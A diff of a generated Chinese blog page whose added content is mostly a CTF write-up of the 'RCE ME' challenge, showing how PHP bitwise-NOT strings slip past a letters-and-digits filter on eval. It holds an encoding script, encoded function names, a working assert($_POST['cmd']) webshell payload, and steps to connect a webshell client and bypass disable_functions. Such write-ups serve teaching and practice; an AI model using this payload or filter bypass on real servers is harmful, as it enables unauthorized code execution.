@@ -1902,6 +1902,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -1997,6 +2001,36 @@
     
   
     JS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/php/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PHP
   
 
     
@@ -2589,6 +2623,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../../category/%E6%B5%81%E5%8C%85%E8%A3%85%E5%99%A8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    流包装器
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../../category/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" class="md-nav__link">
         
   
@@ -2756,6 +2820,215 @@
       <header class="md-typeset">
         <h1 id="wp">WP 博客<a class="headerlink" href="#wp" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-22 00:00:00+00:00">2026-10-22</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../category/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-meta__link">代码执行</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="2019-rce-me"><a class="toclink" href="../../rce-me/">[极客大挑战 2019] RCE ME —— 只有符号能用时怎么写代码</a></h2>
+<h3 id="_1"><a class="toclink" href="../../rce-me/#_1">题目</a></h3>
+<p>过滤掉<strong>所有字母和数字</strong>，<code>eval($code)</code> 只能吃符号。</p>
+<p><strong>这逼出一个核心技术：按位取反。</strong></p>
+<h3 id="_2"><a class="toclink" href="../../rce-me/#_2">原理</a></h3>
+<p>PHP 对字符串做 <code>~</code> 是<strong>逐字节取反</strong>：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="x">~"a"      →  0x9E（非打印字符）</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="x">~"\x9E"   →  'a'   （反过来）</span>
+</span></code></pre></div>
+<p><strong>所以只要写出「目标字符串取反后的字节」，运行时就能还原出任意单词。</strong></p>
+<p><strong>关键：这些字节 URL 编码后全是 <code>%xx</code>，不含任何字母数字 → 能过过滤。</strong></p>
+<h3 id="_3"><a class="toclink" href="../../rce-me/#_3">脚本</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">nt</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'</span><span class="si">%%%02x</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="o">~</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">)</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="nb">print</span><span class="p">(</span><span class="n">nt</span><span class="p">(</span><span class="s2">"assert"</span><span class="p">))</span>    <span class="c1"># %9e%8c%8c%9a%8d%8b</span>
+</span></code></pre></div>
+<h3 id="_4"><a class="toclink" href="../../rce-me/#_4">常用对照表</a></h3>
+<table>
+<thead>
+<tr>
+<th>目标</th>
+<th>取反 + URL 编码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>assert</code></td>
+<td><code>%9e%8c%8c%9a%8d%8b</code></td>
+</tr>
+<tr>
+<td><code>eval</code></td>
+<td><code>%9a%89%9e%93</code></td>
+</tr>
+<tr>
+<td><code>system</code></td>
+<td><code>%8c%86%8c%8b%9a%92</code></td>
+</tr>
+<tr>
+<td><code>phpinfo</code></td>
+<td><code>%8f%97%8f%96%91%99%90</code></td>
+</tr>
+<tr>
+<td><code>_POST</code></td>
+<td><code>%a0%af%b0%ac%ab</code></td>
+</tr>
+<tr>
+<td><code>cmd</code></td>
+<td><code>%9c%92%9b</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="payload"><a class="toclink" href="../../rce-me/#payload">payload</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x">$_=~"%9e%8c%8c%9a%8d%8b";      // $_ = "assert"</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="x">$__=~"%a0%af%b0%ac%ab";        // $__ = "_POST"</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="x">$_(${$__}[~"%9c%92%9b"]);      // assert($_POST["cmd"])</span>
+</span></code></pre></div>
+<p><strong>逐段看：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>$_=~"..."          变量名只用 $ 和 _,不含字母 ✓
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>${$__}[...]        用变量的值当变量名 → $_POST
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>[~"%9c%92%9b"]     数组下标也可以是取反表达式 → ["cmd"]
+</span></code></pre></div>
+<h3 id="eval-assert"><a class="toclink" href="../../rce-me/#eval-assert">为什么要在 eval 里套一层 assert</a></h3>
+<p>这题的入口是：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="x">@eval($code);        // $code 里不能有字母和数字</span>
+</span></code></pre></div>
+<p><strong>所以 <code>$code</code> 只能写符号 —— 但"写不出字母"不等于"跑不了代码"，关键就在这层 <code>assert</code>。</strong></p>
+<h4 id="eval_postcmd"><a class="toclink" href="../../rce-me/#eval_postcmd">为什么不能直接 <code>eval($_POST['cmd'])</code></a></h4>
+<p><strong>两个原因，第二个是决定性的。</strong></p>
+<p><strong>① 你写不出 <code>eval</code> 这个词</strong></p>
+<p><strong>取反其实能构造出来：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="x">$_=~"%9a%89%9e%93";      // $_ = "eval"</span>
+</span></code></pre></div>
+<p><strong>② 但就算构造出来了，也用不了 —— <code>eval</code> 不是函数</strong></p>
+<p><strong>实测：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>$f = 'eval';
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>$f('echo "hello";');
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>→ ❌ Call to undefined function eval()
+</span></code></pre></div>
+<p><strong><code>eval</code> 是</strong>语言结构<strong>（和 <code>echo</code>、<code>if</code> 一样），</strong>不是函数<strong>。
+所以「变量函数调用」<code>$f()</code> 根本调不到它 —— PHP 会去找一个名叫 <code>eval()</code> 的函数，找不到。</strong></p>
+<h4 id="_5"><a class="toclink" href="../../rce-me/#_5">所以必须换一个「能把字符串当代码跑」的函数</a></h4>
+<p><strong><code>assert</code> 就是（PHP &lt; 7.2）：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="x">$g = 'assert';</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="x">$g('system("id")');      // ✅ 能调用，而且参数会被当代码求值</span>
+</span></code></pre></div>
+<p><strong>但它求的是</strong>表达式<strong>，不是语句：</strong></p>
+<table>
+<thead>
+<tr>
+<th>写法</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>assert('system("id")')</code></td>
+<td>✅ 函数调用是表达式，能跑</td>
+</tr>
+<tr>
+<td><code>assert('echo "hi";')</code></td>
+<td>❌ <code>Failure evaluating code</code>（<code>echo</code> 是语句）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>所以 POST 里传的必须是一句</strong>表达式<strong>（比如 <code>system('cat /flag')</code>），不能带 <code>;</code> 和多条语句。</strong></p>
+<h4 id="_6"><a class="toclink" href="../../rce-me/#_6">于是就成了「两层」</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>eval(                      ← 外层：服务器给的，只能用符号写
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>  assert(                  ← 内层：用取反拼出来的函数名
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>    $_POST['cmd']          ← 这里可以随便写字母
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>  )
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>)
+</span></code></pre></div>
+<p><strong>一句话：</strong></p>
+<blockquote>
+<p><strong>外层负责「绕过过滤」，内层负责「把带字母的代码真正跑起来」。</strong></p>
+</blockquote>
+<p><strong>没有 <code>assert</code> 这一层，你用取反拼出来的 <code>system</code> 只是一个</strong>字符串<strong>，不会被当成代码执行。</strong></p>
+<div class="admonition note">
+<p class="admonition-title">版本限制</p>
+<p><code>assert()</code> 的字符串参数在 <strong>PHP 7.2 起被废弃</strong>，<strong>PHP 8.0 移除</strong>。
+这题能过，说明靶场是 PHP 5.x / 7.0~7.1。</p>
+</div>
+<h3 id="_7"><a class="toclink" href="../../rce-me/#_7">后面的路</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>① phpinfo 查 disable_functions → assert、eval 还在
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>② 构造一句话 → 蚁剑连接
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>③ 根目录有 flag 但读不了(权限)
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>④ 旁边有 /readflag(SUID 程序)
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>⑤ 装蚁剑「绕过 disable_functions」插件
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>⑥ 开终端 → whoami 可用,但 /readflag 没反应
+</span></code></pre></div>
+<h3 id="readflag"><a class="toclink" href="../../rce-me/#readflag">/readflag 没输出的排查</a></h3>
+<p><strong>先分清「能用」的含义：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>cd        →  蚁剑自己实现的,不是真命令
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>whoami    →  真的二进制在跑  ← 所以问题在 /readflag 本身
+</span></code></pre></div>
+<p><strong>诊断命令：</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>ls<span class="w"> </span>-l<span class="w"> </span>/readflag<span class="w">              </span><span class="c1"># 有没有 SUID(s 位)</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>id<span class="w">                           </span><span class="c1"># 当前是谁</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>/readflag<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w">               </span><span class="c1"># stderr 合并</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>/readflag<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"EXIT=</span><span class="nv">$?</span><span class="s2">"</span><span class="w">    </span><span class="c1"># 看退出码</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>/readflag<span class="w"> </span>&gt;<span class="w"> </span>/tmp/a<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/tmp/a
+</span></code></pre></div>
+<p><strong>退出码：</strong></p>
+<table>
+<thead>
+<tr>
+<th>EXIT</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0 但没输出</td>
+<td>输出被吞 → 重定向到文件</td>
+</tr>
+<tr>
+<td>126</td>
+<td>没有执行权限</td>
+</tr>
+<tr>
+<td>127</td>
+<td>命令找不到</td>
+</tr>
+<tr>
+<td>137</td>
+<td>被 kill</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_8"><a class="toclink" href="../../rce-me/#_8">收获</a></h3>
+<blockquote>
+<p><strong>字母数字被封 ≠ 写不了代码 —— 按位取反能把任意符号变成任意单词。</strong></p>
+<p><strong>有 <code>eval</code> 就够 —— <code>assert($_POST["cmd"])</code> 就是完整的一句话。</strong></p>
+<p><strong>有命令执行 ≠ 能读 flag —— <code>/flag</code> 常常是 0400 root，得靠 SUID 的 <code>/readflag</code>。</strong></p>
+<p><strong>终端里"没反应"先看 stderr 和退出码，别急着换工具。</strong></p>
+</blockquote>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
